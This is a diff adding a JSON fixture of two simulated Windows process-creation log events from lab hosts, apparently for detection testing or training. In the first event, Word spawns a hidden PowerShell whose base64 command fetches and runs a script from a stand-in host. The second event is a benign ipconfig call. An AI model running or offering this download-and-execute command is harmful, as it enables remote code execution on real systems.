@@ -1,0 +1,38 @@
+[
+  {
+    "timestamp": "2026-04-20T13:42:18Z",
+    "host": "LAB-WIN10-01",
+    "event_id": 4688,
+    "event_name": "Process Creation",
+    "user": "lab-user",
+    "domain": "LAB",
+    "process_id": 5328,
+    "process_name": "powershell.exe",
+    "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAtAGMAbwBtAG0AYQBuAGQALgB0AGUAcwB0AC8AcwB0AGEAZwBlACcAKQA=",
+    "parent_process_id": 4180,
+    "parent_process_name": "winword.exe",
+    "parent_process_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "parent_command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\lab-user\\Downloads\\invoice_review.docx\"",
+    "integrity_level": "Medium",
+    "log_source": "simulated"
+  },
+  {
+    "timestamp": "2026-04-20T14:05:44Z",
+    "host": "LAB-WIN10-02",
+    "event_id": 4688,
+    "event_name": "Process Creation",
+    "user": "admin-user",
+    "domain": "LAB",
+    "process_id": 6184,
+    "process_name": "cmd.exe",
+    "process_path": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "cmd.exe /c ipconfig /all",
+    "parent_process_id": 2512,
+    "parent_process_name": "explorer.exe",
+    "parent_process_path": "C:\\Windows\\explorer.exe",
+    "parent_command_line": "C:\\Windows\\explorer.exe",
+    "integrity_level": "Medium",
+    "log_source": "simulated"
+  }
+]
